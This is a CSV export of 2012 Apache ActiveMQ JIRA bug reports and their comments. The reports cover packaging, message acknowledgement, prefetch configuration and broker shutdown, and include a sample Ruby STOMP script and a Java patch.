# perfharness.jar files are in the current directory.  If they are not,",,davsclaus,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249871,,,Tue Oct 02 07:08:23 UTC 2012,,,,,,,,,,,"0|i0amhj:",59916,,,,,,,,,,,,,,,,,,,,,"02/Oct/12 07:05;davsclaus;Also the script do not have +x for unix environments. So you would need to 
chmod +x perfharness-activemq.sh

Wonder if we should try to do this in the assembly.;;;","02/Oct/12 07:08;davsclaus;Also the ruby example dont have execute permission on its rb files.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Linux/Unix Files Have Incorrect EOL When Packaged,AMQ-4084,12609462,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jgomes,jgomes,27/Sep/12 22:12,27/Sep/12 22:25,14/Jul/23 05:43,27/Sep/12 22:18,5.6.0,,,,,5.7.0,,,Broker,,,,0,eol,,,,,,,,"When building the broker on a Windows machine, the Linux/Unix specific files are not converted to the correct EOL character.  Specifically, the activemq and activemq-admin script files.  If these files are not converted when the package is built on a Windows machine, then the broker fails to run when deployed on a Linux/Unix machine.",Windows,jgomes,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Sep/12 22:13;jgomes;windows-bin.xml.patch;https://issues.apache.org/jira/secure/attachment/12546918/windows-bin.xml.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249721,,,Thu Sep 27 22:25:10 UTC 2012,,,,,,,Patch Available,,,,"0|i0ah3b:",59042,,,,,,,,,,,,,,,,,,,,,"27/Sep/12 22:13;jgomes;Set the EOL for Unix specific files.;;;","27/Sep/12 22:18;tabish;looks good, patch applied. Thanks!;;;","27/Sep/12 22:25;jgomes;Thanks, Tim!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consumers in Client Ack sessions can fail to ack expired messages in some cases,AMQ-4083,12609287,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,tabish,tabish,tabish,26/Sep/12 18:50,27/Sep/12 18:19,14/Jul/23 05:43,27/Sep/12 18:19,5.5.1,5.6.0,,,,5.7.0,,,JMS client,,,,0,,,,,,,,,"For a consumer in Client Ack sessions, if a Message is acked in some cases and there is an outstanding pending ack for expired messages the pending ack will get dropped and the messages are never acked, is this happen enough the consumer can stall. ",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249722,,,Thu Sep 27 18:19:00 UTC 2012,,,,,,,,,,,"0|i0ah3j:",59043,,,,,,,,,,,,,,,,,,,,,"26/Sep/12 20:04;tabish;fixed on trunk.;;;","27/Sep/12 12:32;tabish;Fix causes test: org.apache.activemq.JmsSendReceiveWithMessageExpirationTest to fail.  Will need to investigate further. ;;;","27/Sep/12 18:19;tabish;new fix and more tests added.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
favicon should be handled as binary file in assembly,AMQ-4081,12609193,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,26/Sep/12 08:27,26/Sep/12 08:28,14/Jul/23 05:43,26/Sep/12 08:28,,,,,,5.7.0,,,,,,,0,,,,,,,,,In the assembly we should include the webapps/favicon.ico as a binary file.,,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249723,,,2012-09-26 08:27:21.0,,,,,,,,,,,"0|i0ah3r:",59044,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integrate the Fusesource LevelDB module into the ActiveMQ build.,AMQ-4080,12609050,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,25/Sep/12 14:31,25/Sep/12 14:51,14/Jul/23 05:43,25/Sep/12 14:51,,,,,,,,,,,,,0,,,,,,,,,,,chirino,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,255306,,,Tue Sep 25 14:51:01 UTC 2012,,,,,,,,,,,"0|i0equv:",84113,,,,,,,,,,,,,,,,,,,,,"25/Sep/12 14:51;chirino;Integrated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sizePrefixDisabled and/or maxFrameSize change in AcriveMq 5.6 broke FilePendingMessageCursor for big messages,AMQ-4076,12609005,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,gtully,gtully,25/Sep/12 10:50,25/Sep/12 11:40,14/Jul/23 05:43,25/Sep/12 11:40,5.6.0,,,,,5.7.0,,,Broker,Transport,,,0,,,,,,,,,"https://issues.apache.org/jira/browse/AMQ-498 causes problem for default marshaller created by cursor.
see: http://activemq.2283324.n4.nabble.com/sizePrefixDisabled-and-or-maxFrameSize-change-in-AcriveMq-5-6-broke-FilePendingMessageCursor-for-bigs-tp4656898.html;cid=1348569651674-314

The default should be unlimited so that the check is done by the transports, the store just unmarshalls/marshalls",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-498,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249724,,,Tue Sep 25 11:40:54 UTC 2012,,,,,,,,,,,"0|i0ah3z:",59045,,,,,,,,,,,,,,,,,,,,,"25/Sep/12 11:40;gtully;Fix in http://svn.apache.org/viewvc?rev=1389817&view=rev - explicit limit now set in the xml config, default is unlimited/MAX_LONG so the marshalers used by the cursors don't enforce the limits.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot shut down broker under certain conditions with schedule delivery and producer flow control,AMQ-4073,12608943,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,davaleri,davaleri,24/Sep/12 23:13,05/Sep/13 19:59,14/Jul/23 05:43,05/Sep/13 19:59,5.6.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When producer flow control is enabled and the the job scheduler attempts delivery, the job scheduler blocks while attempting delivery.  This blocking holds the lock on the job scheduler and stops all other job scheduler activity.  The holding of the lock on the job scheduler also blocks the delivery of additional scheduled messages and can impact the shutdown of the broker.

org.apache.activemq.broker.scheduler.JobSchedulerImpl.schedule(String, ByteSequence, String, long, long, int) waits for the lock while the job scheduler is blocked.  Any transport connections attempting to call this method get blocked and are also unable to shutdown.  Connections do log ""2012-09-24 12:04:23,661 [main           ] - INFO  TransportConnection            - The connection to 'vm://localhost#0' is taking a long time to shutdown."" when attempting shutdown with the job scheduler blocked and a client attempting to schedule a message, but do not log anything when this situation occurs under normal broker operation.  The producer simply stops producing messages.

The shutdown is blocked by org.apache.activemq.broker.TransportConnection.serviceLock as it is owned by the blocked thread trying to schedule a new message.

I have attached a unit test that reproduces the issue.  The test will not complete as it hangs on the broker shutdown as described above.",,ceposta,davaleri,donnchadh,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3141,,,,,,,,,,,,,"24/Sep/12 23:13;davaleri;JobSchedulerBrokerShutdownTest.java;https://issues.apache.org/jira/secure/attachment/12546403/JobSchedulerBrokerShutdownTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249868,,,Thu Sep 05 19:59:25 UTC 2013,,,,,,,,,,,"0|i0amb3:",59887,,,,,,,,,,,,,,,,,,,,,"05/Sep/13 19:59;tabish;Fixed on trunk.  Will appear in the next nightly. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
catstomp.rb does not work anymore,AMQ-4070,12608665,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,davsclaus,francescm,francescm,21/Sep/12 17:08,25/Sep/12 11:01,14/Jul/23 05:43,25/Sep/12 11:01,5.6.0,,,,,5.7.0,,,Samples,,,,0,,,,,,,,,"with the most recente stomp gem, the send method has been replaced with publish, so the bundled catstomp does not longer work.

Follows a proposal of a working catstomp.rb with one improvement: now it stops gracefully con CTRL+C

cheers,

Francesco

#!/usr/bin/env ruby
# ------------------------------------------------------------------------
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the ""License""); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ------------------------------------------------------------------------

require 'rubygems'
require 'stomp'

continue = true

trap(""INT"") {
  puts ""CTRL+C""
  puts ""shutting down ...""
  @conn.disconnect
  sleep 1
  STDIN.close
}

  
@port = 61613
@host = ""localhost""
@user = ENV[""STOMP_USER""];
@password = ENV[""STOMP_PASSWORD""]
    
@host = ENV[""STOMP_HOST""] if ENV[""STOMP_HOST""] != NIL
@port = ENV[""STOMP_PORT""] if ENV[""STOMP_PORT""] != NIL
    
@destination = ""/topic/stompcat""
@destination = $*[0] if $*[0] != NIL
    
$stderr.print ""Connecting to stomp://#{@host}:#{@port} as #{@user}\n""
@conn = Stomp::Connection.open @user, @password, @host, @port, true
$stderr.print ""Sending input to #{@destination}\n""

@headers = {'persistent'=>'false'} 
@headers['reply-to'] = $*[1] if $*[1] != NIL

begin
  STDIN.each_line { |line| 
    @conn.publish @destination, line, @headers
  }
rescue IOError
end
",,davsclaus,francescm,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249725,,,Tue Sep 25 11:01:02 UTC 2012,,,,,,,Patch Available,,,,"0|i0ah47:",59046,,,,,,,,,,,,,,,,,,,,,"25/Sep/12 11:01;davsclaus;Thanks for the patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
durableTopicPrefetch attribute in policyEntry in activemq.xml dont take effect,AMQ-4062,12607997,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,liuming,liuming,18/Sep/12 02:42,15/Nov/12 22:33,14/Jul/23 05:43,15/Nov/12 22:33,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"There are three methods to configure the prefetchSize of a consumer,per broker,per connection and per destination.I configured the policyEntry element in activemq.xml and set durableTopicPrefetch=""5"".Then a durable topic Consumer connected to the broker ,but the prefetchSize instance variable of ConsumerInfo object was 100, the default value for durable topic consumer.Some messages of the topic consumer were stored in the kahaDB.",windows XP jdk1.6,gtully,liuming,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Sep/12 08:47;tabish;AMQ4062Test.java;https://issues.apache.org/jira/secure/attachment/12546016/AMQ4062Test.java","21/Sep/12 22:15;liuming;AMQ4062TestNew.java;https://issues.apache.org/jira/secure/attachment/12546104/AMQ4062TestNew.java","21/Sep/12 02:02;liuming;ming.zip;https://issues.apache.org/jira/secure/attachment/12545990/ming.zip",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249731,,,Thu Nov 15 22:33:30 UTC 2012,,,,,,,,,,,"0|i0ah5j:",59052,,,,,,,,,,,,,,,,,,,,,"18/Sep/12 03:57;tabish;It would be useful if you could create and attach a JUnit test case that demonstrates your issue.  This will allow for quicker turnaround and ensure that the fix stays into the future.  ;;;","21/Sep/12 02:02;liuming;test case.unzip and put it the src/test/java;;;","21/Sep/12 02:16;liuming;I've created a testcase.The PolicyEntry configure the DurableTopicSubscription correctly when there's nothing for the topic in the Kaha storage.When KahaDB contains some messages for that topic,Destination and Subscription info will be recovered and ConsumerInfo will be created in addSubscriptionsForDestination method in TopicRegion class.After that the value of prefetchSize of the ConsumerInfo is zero.;;;","21/Sep/12 08:47;tabish;Modified version of the attached test that puts everything into one file.;;;","21/Sep/12 08:48;tabish;I modified the test case and ran it against 5.7-SNAPSHOT tests all pass without issue.  A cursory review of the code would seem to indicate that everything is working as it should be.;;;","21/Sep/12 22:15;liuming;the code 
assertEquals(100, info.getPrefetchSize()) 
in testSecondStart should be 
assertEquals(5, info.getPrefetchSize());
because 
policy.setDurableTopicPrefetch(PREFETCH_SIZE_5);;;;","25/Sep/12 15:03;tabish;I think I see what's going wrong, will start working on a fix.;;;","25/Sep/12 22:22;tabish;Fixed on trunk.;;;","14/Nov/12 20:55;gtully;This change seems to break org.apache.activemq.store.MessagePriorityTest#testDurableSubs
the problem is that the pendingmessage cursor is reset on activate but with the default keepDurableSubsActive, the state in that cursor about subscribed destinations is lost.
I think we should not call policyentry.configure if keepDurableSubsActive is set and we have been deactivated. Not sure if there is an easy way to determine that.;;;","14/Nov/12 20:57;gtully;the unusual thing about that test is that it sets a setPendingDurableSubscriberPolicy via a policy, which triggers the reset.
The test works if brokerService.setKeepDurableSubsActive(false) is used.;;;","14/Nov/12 22:39;tabish;So far I don't see any way to tell if the sub was just deactivated or is coming back from a clean broker start, seems the only way so far is to only reconfigure on setKeepDurableSubsActive(false);;;","15/Nov/12 22:33;tabish;Updated fix applied the settings only if keepDurableSubsActive is false the policy is only applied if durable subs go inactive otherwise they retain their original configuration. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
http transport should remove options in uri,AMQ-4058,12607893,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,17/Sep/12 12:02,17/Sep/12 12:05,14/Jul/23 05:43,17/Sep/12 12:05,5.6.0,,,,,5.7.0,,,Transport,,,,0,,,,,,,,,"When using the http/https transports and have options for soTimeout etc. then they should be stripped from the uri we use to call the remote http server.

",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249733,,,2012-09-17 12:02:59.0,,,,,,,,,,,"0|i0ah5z:",59054,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When consumers was killed and restarted frequently, some messages could not be consumed by consumer but they were still in pending messages.",AMQ-4052,12607848,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,vivian58659,vivian58659,17/Sep/12 03:23,21/Sep/12 08:05,14/Jul/23 05:43,21/Sep/12 08:05,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"The phenomenon of the bug:
When consumers was killed and restarted frequently, some messages could not be consumed by consumer but they were still in pending messages.

Reason:
When consumer consumes messages in transaction, it sends ack command and transaction commit command separately, if the consumer was killed between ack command and transaction commit command, in other words the Broker only received the ack command but did not receive the transaction commit command, this lead to the message in PrefetchSubscription’s dispatched list was set ack true, but was not removed from dispatched list. When the consumer was killed, Queue#removeSubscription() was called, in this method, PrefetchSubscription#remove() was called to put PrefetchSubscription’s pending list and dispatched list to Queue’s redeliveredWaitingDispatch list. After that, when Queue#doDispatch() was called, the redeliveredWaitingDispatch list was transferred to Queue#doActualDispatch () method to dispatch the messages to consumer again. In Queue#doActualDispatch () method, if all consumers isFull() method returns true, the target is null and the expression “interestCount > 0” become the only condition to judge if the message should be put back to the  redeliveredWaitingDispatch, but now the message’s isAcked() method returns true, this lead to interestCount is 0, and then the message was not put back to redeliveredWaitingDispatch, but it was not consumed and was still in pagedInMessages. 

Solution:
In PrefetchSubscription#remove() method, set ack status to false for all messages in dispatched list. The code as follows:

{code}

    public List<MessageReference> remove(ConnectionContext context, Destination destination) throws Exception {
        List<MessageReference> resultList = new ArrayList<MessageReference>();
        synchronized(pendingLock) {
            super.remove(context, destination);
            // Here is a potential problem concerning Inflight stat:
            // Messages not already committed or rolled back may not be removed from dispatched list at the moment
            // Except if each commit or rollback callback action comes before remove of subscriber.
            resultList.addAll(pending.remove(context, destination));

            // Synchronized to DispatchLock
            synchronized(dispatchLock) {
                ArrayList<MessageReference> references = new ArrayList<MessageReference>();
                for (MessageReference msgRef : dispatched) {
                    if( msgRef.getRegionDestination() == destination) {
                        references.add(msgRef);
                        if (msgRef instanceof QueueMessageReference) {
                        	QueueMessageReference ref = (QueueMessageReference) msgRef;
                        	ref.setAcked(false);
                        }
                    }
                }
                resultList.addAll(references);
                destination.getDestinationStatistics().getDispatched().subtract(references.size());
                destination.getDestinationStatistics().getInflight().subtract(references.size());
                dispatched.removeAll(references);
            }
        }
        
        return resultList;
    }
{code}

The solution can solve the problem, I want to know if the solution can lead to other problems.","CentOS release 5.6 (Final) java version ""1.6.0_30""",tabish,tnarake,vivian58659,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249737,,,Fri Sep 21 08:05:04 UTC 2012,,,,,,,,,,,"0|i0ah6v:",59058,,,,,,,,,,,,,,,,,,,,,"17/Sep/12 03:42;tabish;Before any patch can be applied we need unit tests to verify the problem and ensure it stays fixed.  Also there were some fixes in this area since v5.6.0 are you testing against the 5.7-SNAPSHOT code and builds?;;;","19/Sep/12 10:43;vivian58659;I tested against the apache-activemq-5.7-fuse-20120912.001718-11 code and builds in these two days and found that the problem still exists.

Reason:
In method PrefetchSubscription#dispatchPending(), pending.remove() made the message removed from the pending, but if canDispatch(node) returns false, the method PrefetchSubscription#dispatch(node) was not called and the message could not put to dispatched list, so the message was not sent to client and can not put back to Queue#redeliveredWaitingDispatch. 
When canDispatch(node) return false? If the server received the acknowledge commmand but did not received the transaction commit command, node.isAcked() returns true and node.isDropped() returns false, the result is false.

org.apache.activemq.broker.region.QueueSubscription
  protected boolean canDispatch(MessageReference n) throws IOException {
    boolean result = true;
    QueueMessageReference node = (QueueMessageReference)n;
    if ((node.isAcked()) || (node.isDropped())) {
      result = false;
    }
    result = (result) && ((isBrowser()) || (node.lock(this)));
    return result;
  };;;","19/Sep/12 10:45;tabish;We need a JUnit test case to show that the issue exists.;;;","21/Sep/12 07:12;vivian58659;If the consumer was killed, the broker will rollback the transaction. In rollback method, broker will set the acked status to false of the message of which the broker had received the ack command but hadn't received the commit command from consumer. But before the rollback method was called, the dispatch thread was still running, if there is new consumers, the message whose acked status is true will still be dispatched.

At first, I thought the bug still exists in version5.7,  because I only noticed the change:
from
if (!node.isDropped() && !((QueueMessageReference) node).isAcked() && (!node.isDropped() || s.getConsumerInfo().isBrowser()))
to
if (!node.isDropped()),

but didn't notice the change:
from
if (dispatchSelector.canSelect(s, node) && assignMessageGroup(s, (QueueMessageReference)node))
to
if (dispatchSelector.canSelect(s, node) && assignMessageGroup(s, (QueueMessageReference)node) && !((QueueMessageReference) node).isAcked() ).

The appended condition ""!((QueueMessageReference) node).isAcked()"" will prevent the message whose acked status is true from being dispatched. So the bug was fixed in version 5.7. 


;;;","21/Sep/12 08:05;tabish;Fixed in 5.7, thanks for closing the loop on this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-optional - Should include the JARs it needs,AMQ-4047,12607223,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,12/Sep/12 11:37,17/Sep/12 10:01,14/Jul/23 05:43,17/Sep/12 10:01,,,,,,5.7.0,,,,,,,0,,,,,,,,,"Installing activemq-optional, do not include all the JARs it needs. eg in the pom.xml file we got a number of JARs which isn't installed.",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249739,,,2012-09-12 11:37:03.0,,,,,,,,,,,"0|i0ah7b:",59060,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Shutting down AcitveMQ broker started in foreground logs 2 times,AMQ-4044,12607057,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,davsclaus,davsclaus,11/Sep/12 13:09,14/Sep/12 09:14,14/Jul/23 05:43,14/Sep/12 09:14,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"Staring AMQ in the foreground

$bin/activemq console

{code}
^C INFO | ActiveMQ Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) is shutting down
 INFO | ActiveMQ Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) is shutting down
 INFO | Connector openwire Stopped
 INFO | Connector vm://localhost Stopped
 INFO | PListStore:[/opt/apache-activemq-5.6.0/data/localhost/tmp_storage ] stopped
 INFO | Stopping async queue tasks
 INFO | Stopping async topic tasks
 INFO | Stopped KahaDB
 INFO | ActiveMQ JMS Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) stopped
 INFO | Connector openwire Stopped
 INFO | ActiveMQ JMS Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) stopped
{code}

Notice it says shutting down 2 times, as well stopping 2 times. We should try to look into this and only issue 1 shutdown/stop.
",,davsclaus,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249741,,,Fri Sep 14 08:45:12 UTC 2012,,,,,,,,,,,"0|i0ah7r:",59062,,,,,,,,,,,,,,,,,,,,,"11/Sep/12 13:13;gtully;thought: looks like two log4j appenders are in the mix;;;","12/Sep/12 06:12;tabish;It looks as though we have multiple shutdown hooks registered, I noticed this the other day when I noticed some of the tests also doing this multiple stopping / shutdown logging.;;;","13/Sep/12 04:11;tabish;Threw in a couple quick logs statements: here's who's calling it twice from the console.

{noformat}
BrokerService Stop called from thread: Thread[Thread-18,5,main]
java.lang.Exception: Stack trace
	at java.lang.Thread.dumpStack(Thread.java:1273)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:709)
	at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:94)
	at org.apache.activemq.console.command.StartCommand$1.run(StartCommand.java:138)
 INFO | ActiveMQ 5.7-SNAPSHOT JMS Message Broker (localhost, ID:timothy-bishs-macbook-pro.local-64982-1347509296619-0:1) is shutting down
 INFO | BrokerService Stop called from thread: Thread[ActiveMQ ShutdownHook,5,main]
java.lang.Exception: Stack trace
	at java.lang.Thread.dumpStack(Thread.java:1273)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:709)
	at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:94)
	at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:2300)
	at org.apache.activemq.broker.BrokerService$6.run(BrokerService.java:2267)
{noformat}
;;;","13/Sep/12 07:58;davsclaus;Yeah I had a hunch it was a shutdown hook, kicking in at the same time.;;;","14/Sep/12 08:45;davsclaus;Its the same if you do bin/activemq start and then stop it later
{code}
